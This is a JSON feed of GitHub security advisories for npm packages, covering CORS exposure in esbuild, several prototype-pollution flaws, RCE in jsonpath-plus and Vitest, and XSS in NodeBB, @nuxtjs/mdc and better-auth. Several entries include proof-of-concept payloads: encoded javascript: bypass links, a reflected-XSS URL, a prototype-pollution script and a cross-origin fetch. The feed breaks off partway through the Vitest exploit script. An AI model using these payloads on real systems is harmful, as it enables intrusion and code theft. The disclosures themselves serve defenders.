{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There is a security vulnerability in outdated versions of Coinbase Wallet SDK. This does not directly affect users' keys, smart contracts, or funds.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Please update to version &gt;= 4.3.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/coinbase/coinbase-wallet-sdk/security/advisories/GHSA-8rgj-285w-qcq4\">https://github.com/coinbase/coinbase-wallet-sdk/security/advisories/GHSA-8rgj-285w-qcq4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8rgj-285w-qcq4\">https://github.com/advisories/GHSA-8rgj-285w-qcq4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8rgj-285w-qcq4",
            "title": "[@coinbase/wallet-sdk] Unknown vulnerability in Coinbase Wallet SDK",
            "date_modified": "2025-02-10T17:59:10.000Z",
            "date_published": "2025-02-10T17:59:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8rgj-285w-qcq4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.</p>\n<h3 id=\"details\">Details</h3>\n<p>esbuild sets <code>Access-Control-Allow-Origin: *</code> header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.</p>\n<p><a href=\"https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\">https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121</a>\n<a href=\"https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\">https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363</a></p>\n<p><strong>Attack scenario</strong>:</p>\n<ol>\n<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker sends a <code>fetch('http://127.0.0.1:8000/main.js')</code> request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.</li>\n<li>The attacker gets the content of <code>http://127.0.0.1:8000/main.js</code>.</li>\n</ol>\n<p>In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by</p>\n<ul>\n<li>Fetching <code>/index.html</code>: normally you have a script tag here</li>\n<li>Fetching <code>/assets</code>: it's common to have a <code>assets</code> directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files</li>\n<li>Connecting <code>/esbuild</code> SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (<code>new EventSource('/esbuild').addEventListener('change', e =&gt; console.log(e.type, e.data))</code>)</li>\n<li>Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file</li>\n</ul>\n<p>The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Download <a href=\"https://github.com/user-attachments/files/18561484/reproduction.zip\">reproduction.zip</a></li>\n<li>Extract it and move to that directory</li>\n<li>Run <code>npm i</code></li>\n<li>Run <code>npm run watch</code></li>\n<li>Run <code>fetch('http://127.0.0.1:8000/app.js').then(r =&gt; r.text()).then(content =&gt; console.log(content))</code> in a different website's dev tools.</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Users using the serve feature may get the source code stolen by malicious websites.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\">https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99</a></li>\n<li><a href=\"https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\">https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-67mh-4wv8-2f99\">https://github.com/advisories/GHSA-67mh-4wv8-2f99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99",
            "title": "[esbuild] esbuild enables any website to send any requests to the development server and read the response",
            "date_modified": "2025-02-10T17:48:08.000Z",
            "date_published": "2025-02-10T17:48:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A persistent cross-site scripting (XSS) vulnerability in NodeBB v3.11.0 allows remote attackers to store arbitrary code in the 'about me' section of their profile.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57041\">https://nvd.nist.gov/vuln/detail/CVE-2024-57041</a></li>\n<li><a href=\"https://github.com/NodeBB/NodeBB/commit/4e69bff72fd04779064d37e46a43080e6c328adf\">https://github.com/NodeBB/NodeBB/commit/4e69bff72fd04779064d37e46a43080e6c328adf</a></li>\n<li><a href=\"https://www.tonysec.com/posts/cve-2024-57041\">https://www.tonysec.com/posts/cve-2024-57041</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqr3-vrrg-f3jh\">https://github.com/advisories/GHSA-vqr3-vrrg-f3jh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqr3-vrrg-f3jh",
            "title": "[nodebb] NodeBB Cross-site scripting (XSS) vulnerability",
            "date_modified": "2025-02-07T20:41:40.000Z",
            "date_published": "2025-01-24T21:31:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqr3-vrrg-f3jh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.createUploader function of @rpldy/uploader v1.8.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57082\">https://nvd.nist.gov/vuln/detail/CVE-2024-57082</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/708e518de0c3b5af7430ec774f68f315\">https://gist.github.com/tariqhawis/708e518de0c3b5af7430ec774f68f315</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pc47-g7gv-4gpw\">https://github.com/advisories/GHSA-pc47-g7gv-4gpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pc47-g7gv-4gpw",
            "title": "[@rpldy/uploader] @rpldy/uploader prototype pollution",
            "date_modified": "2025-02-06T23:47:52.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pc47-g7gv-4gpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.install function of vxe-table v4.8.10 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57080\">https://nvd.nist.gov/vuln/detail/CVE-2024-57080</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/c0b5fa2d7e4edd3f000e73fb7a10ccbc\">https://gist.github.com/tariqhawis/c0b5fa2d7e4edd3f000e73fb7a10ccbc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-89fp-f5mx-748x\">https://github.com/advisories/GHSA-89fp-f5mx-748x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-89fp-f5mx-748x",
            "title": "[vxe-table] vxe-table prototype pollution",
            "date_modified": "2025-02-06T23:40:51.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-89fp-f5mx-748x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.deepMerge function of @zag-js/core v0.50.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57079\">https://nvd.nist.gov/vuln/detail/CVE-2024-57079</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b\">https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fg4m-w35q-vfg2\">https://github.com/advisories/GHSA-fg4m-w35q-vfg2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fg4m-w35q-vfg2",
            "title": "[@zag-js/core] @zag-js/core prototype pollution",
            "date_modified": "2025-02-06T23:32:26.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fg4m-w35q-vfg2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The latest version of utils-extend (1.0.8) is vulnerable to Prototype Pollution through the entry function(s) lib.extend. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57077\">https://nvd.nist.gov/vuln/detail/CVE-2024-57077</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/64bac50f8c2706e6880e45d50a507114\">https://gist.github.com/tariqhawis/64bac50f8c2706e6880e45d50a507114</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7qgg-vw88-cc99\">https://github.com/advisories/GHSA-7qgg-vw88-cc99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7qgg-vw88-cc99",
            "title": "[utils-extend] utils-extend Prototype Pollution",
            "date_modified": "2025-02-06T23:31:54.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7qgg-vw88-cc99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.Logger function of eazy-logger v4.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<p>An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., <code>child_process.exec</code>, <code>eval</code>), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<pre><code class=\"language-js\">(async () =&gt; {\nconst lib = await import('eazy-logger');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.Logger (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'))\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57075\">https://nvd.nist.gov/vuln/detail/CVE-2024-57075</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5\">https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r7jx-5m6m-cpg9\">https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r7jx-5m6m-cpg9",
            "title": "[eazy-logger] eazy-logger prototype pollution",
            "date_modified": "2025-02-07T14:34:56.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r7jx-5m6m-cpg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.requireFromString function of module-from-string v3.3.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57072\">https://nvd.nist.gov/vuln/detail/CVE-2024-57072</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/8b1fe301dd1ea52952cef347daddee67\">https://gist.github.com/tariqhawis/8b1fe301dd1ea52952cef347daddee67</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q5j8-9m9g-x2jh\">https://github.com/advisories/GHSA-q5j8-9m9g-x2jh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q5j8-9m9g-x2jh",
            "title": "[module-from-string] module-from-string prototype pollution",
            "date_modified": "2025-02-06T23:30:55.000Z",
            "date_published": "2025-02-06T06:31:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q5j8-9m9g-x2jh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.mutateMergeDeep function of @tanstack/form-core v0.35.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57068\">https://nvd.nist.gov/vuln/detail/CVE-2024-57068</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/47fe5b1e584e9e573c0933588248d533\">https://gist.github.com/tariqhawis/47fe5b1e584e9e573c0933588248d533</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ggv3-vmgw-xv2q\">https://github.com/advisories/GHSA-ggv3-vmgw-xv2q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ggv3-vmgw-xv2q",
            "title": "[@tanstack/form-core] @tanstack/form-core prototype pollution",
            "date_modified": "2025-02-06T23:30:30.000Z",
            "date_published": "2025-02-06T06:31:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ggv3-vmgw-xv2q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.deep function of @ndhoule/defaults v2.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57066\">https://nvd.nist.gov/vuln/detail/CVE-2024-57066</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/8ee7327cc8b78df738cd32505cbbbd44\">https://gist.github.com/tariqhawis/8ee7327cc8b78df738cd32505cbbbd44</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-79h2-v6hh-wq23\">https://github.com/advisories/GHSA-79h2-v6hh-wq23</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-79h2-v6hh-wq23",
            "title": "[@ndhoule/defaults] @ndhoule/defaults prototype pollution",
            "date_modified": "2025-02-06T22:52:20.000Z",
            "date_published": "2025-02-06T06:31:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-79h2-v6hh-wq23"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package jsonpath-plus before 10.0.7 are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of vm in Node.</p>\n<p><strong>Note:</strong></p>\n<p>There were several attempts to fix it in versions <a href=\"https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0\">10.0.0-10.1.0</a> but it could still be exploited using <a href=\"https://github.com/JSONPath-Plus/JSONPath/issues/226\">different payloads</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21534\">https://nvd.nist.gov/vuln/detail/CVE-2024-21534</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3\">https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884\">https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019\">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/issues/226\">https://github.com/JSONPath-Plus/JSONPath/issues/226</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72\">https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316\">https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0\">https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/pull/233\">https://github.com/JSONPath-Plus/JSONPath/pull/233</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/commit/73ad72e5ee788d8287dea6e8283a3f16f63c9eb8\">https://github.com/JSONPath-Plus/JSONPath/commit/73ad72e5ee788d8287dea6e8283a3f16f63c9eb8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pppg-cpfq-h7wr\">https://github.com/advisories/GHSA-pppg-cpfq-h7wr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pppg-cpfq-h7wr",
            "title": "[jsonpath-plus] JSONPath Plus Remote Code Execution (RCE) Vulnerability",
            "date_modified": "2025-02-06T19:11:00.000Z",
            "date_published": "2024-10-11T15:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pppg-cpfq-h7wr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A command injection vulnerability in the video thumbnail rendering component of files.photo.gallery v0.3.0 through 0.11.0 allows remote attackers to execute arbitrary code via a crafted video file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53615\">https://nvd.nist.gov/vuln/detail/CVE-2024-53615</a></li>\n<li><a href=\"https://github.com/beune/CVE-2024-53615\">https://github.com/beune/CVE-2024-53615</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5wjw-qjhm-v43h\">https://github.com/advisories/GHSA-5wjw-qjhm-v43h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5wjw-qjhm-v43h",
            "title": "[files.photo.gallery] files.photo.gallery command injection",
            "date_modified": "2025-02-06T17:20:26.000Z",
            "date_published": "2025-01-30T15:31:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5wjw-qjhm-v43h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unsafe parsing logic of the URL from markdown can lead to arbitrary JavaScript code due to a bypass to the existing guards around the <code>javascript:</code> protocol scheme in the URL.</p>\n<h3 id=\"details\">Details</h3>\n<p>The parsing logic implement at <a href=\"https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16\">https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16</a> maintains a deny-list approach to filtering potential malicious payload. It does so by matching protocol schemes like <code>javascript:</code> and others.</p>\n<p>Specifically, this is the code from the mdc library's parser that is not secure enough:</p>\n<pre><code class=\"language-js\">export const unsafeLinkPrefix = [\n  'javascript:',\n  'data:text/html',\n  'vbscript:',\n  'data:text/javascript',\n  'data:text/vbscript',\n  'data:text/css',\n  'data:text/plain',\n  'data:text/xml'\n]\n\nexport const validateProp = (attribute: string, value: string) =&gt; {\n  if (attribute.startsWith('on')) {\n    return false\n  }\n\n  if (attribute === 'href' || attribute === 'src') {\n    return !unsafeLinkPrefix.some(prefix =&gt; value.toLowerCase().startsWith(prefix))\n  }\n\n  return true\n}\n</code></pre>\n<p>These security guards can be bypassed by an adversarial that provides JavaScript URLs with HTML entities encoded via hex string.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The following URL payloads if provided to the markdown parsing library (such as through the usage of <code>import { parseMarkdown } from '@nuxtjs/mdc/runtime';</code>) will trigger the alert() dialog:</p>\n<pre><code class=\"language-markdown\"># ✅ This is correctly escaped by the parser\n\n- XSS Attempt:\n\n&lt;a href=\"javascript:alert(1)\"&gt; this gets sanitizied, yay!&lt;/a&gt;\n\n# ❌ These are vulnerable and not escaped\n\n- Bypass 1:\n\n&lt;a href=\"jav&amp;#x09;ascript:alert('XSS');\"&gt;Click Me 1&lt;/a&gt;\n\n- Bypass 2:\n\n&lt;a href=\"jav&amp;#x0A;ascript:alert('XSS');\"&gt;Click Me 2&lt;/a&gt;\n\n- Bypass 3:\n\n&lt;a href=\"jav&amp;#10;ascript:alert('XSS');\"&gt;Click Me 3&lt;/a&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Users who consume this library and perform markdown parsing from unvalidated sources such as LLM generative text responses, user input and other untrusted sources could result in rendering vulnerable XSS anchor links.</p>\n<h2 id=\"reference\">Reference</h2>\n<p>You may infer the following write-up for more in-depth walkthrough of URL parsing problems and suggestions on how to securely address them: <a href=\"https://www.nodejs-security.com/blog/how-to-parse-urls-from-markdown-to-html-securely\">How to Parse URLs from Markdown to HTML Securely?</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt-modules/mdc/security/advisories/GHSA-j82m-pc2v-2484\">https://github.com/nuxt-modules/mdc/security/advisories/GHSA-j82m-pc2v-2484</a></li>\n<li><a href=\"https://github.com/nuxt-modules/mdc/commit/99097738b5561639e9bf247c55d8103236618bf3\">https://github.com/nuxt-modules/mdc/commit/99097738b5561639e9bf247c55d8103236618bf3</a></li>\n<li><a href=\"https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16\">https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24981\">https://nvd.nist.gov/vuln/detail/CVE-2025-24981</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j82m-pc2v-2484\">https://github.com/advisories/GHSA-j82m-pc2v-2484</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j82m-pc2v-2484",
            "title": "[@nuxtjs/mdc] Parsed HTML anchor links in Markdown provided to parseMarkdown can result in XSS in @nuxtjs/mdc",
            "date_modified": "2025-02-06T19:56:41.000Z",
            "date_published": "2025-02-06T17:16:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j82m-pc2v-2484"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The better-auth <code>/api/auth/error</code> page was vulnerable to HTML injection, resulting in a reflected cross-site scripting (XSS) vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>The value of <code>error</code> URL parameter was reflected as HTML on the error page: <a href=\"https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81\">https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://demo.better-auth.com/api/auth/error?error=%3Cscript%3Ealert(1)%3C/script%3E\">https://demo.better-auth.com/api/auth/error?error=%3Cscript%3Ealert(1)%3C/script%3E</a></p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/35b1b95d-3dc9-45fd-89cd-20cd0361bb6c\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker who exploited this vulnerability by coercing a user to visit a specially-crafted URL could execute arbitrary JavaScript in the context of the user's browser.</p>\n<p>Because better-auth is a dependency of web applications, the impact of such a vulnerability is unknowable; it depends on the functionality of the application/site using better-auth. I have calculated the CVSS score assuming the hypothetical victim is an administrator with elevated permissions and access.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/better-auth/better-auth/security/advisories/GHSA-9x4v-xfq5-m8x5\">https://github.com/better-auth/better-auth/security/advisories/GHSA-9x4v-xfq5-m8x5</a></li>\n<li><a href=\"https://github.com/better-auth/better-auth/commit/7ae340e2eddad641b7e43d24d37c58a66ce9ddcf\">https://github.com/better-auth/better-auth/commit/7ae340e2eddad641b7e43d24d37c58a66ce9ddcf</a></li>\n<li><a href=\"https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81\">https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x4v-xfq5-m8x5\">https://github.com/advisories/GHSA-9x4v-xfq5-m8x5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x4v-xfq5-m8x5",
            "title": "[better-auth] Better Auth URL parameter HTML Injection (Reflected Cross-Site scripting)",
            "date_modified": "2025-02-05T21:49:41.000Z",
            "date_published": "2025-02-05T21:49:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x4v-xfq5-m8x5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>When <a href=\"https://vitest.dev/config/#api\"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>\n<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Open Vitest UI.</li>\n<li>Access a malicious web site with the script below.</li>\n<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>\n</ol>\n<pre><code class=\"language-js\">// code from https://github.com/WebReflection/flatted\nconst Flatted=function(n){\"use strict\";function t(n){return t=\"function\"==typeof Symbol&amp;&amp;\"symbol\"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;\"function\"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?\"symbol\":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=\"string\",i={},c=\"object\",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({\"\":i},\"\",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return\"\"===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({\"\":n},\"\",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return\"[\"+s.join(\",\")+\"]\";function S(n,r){if(v)return v=!v,r;var 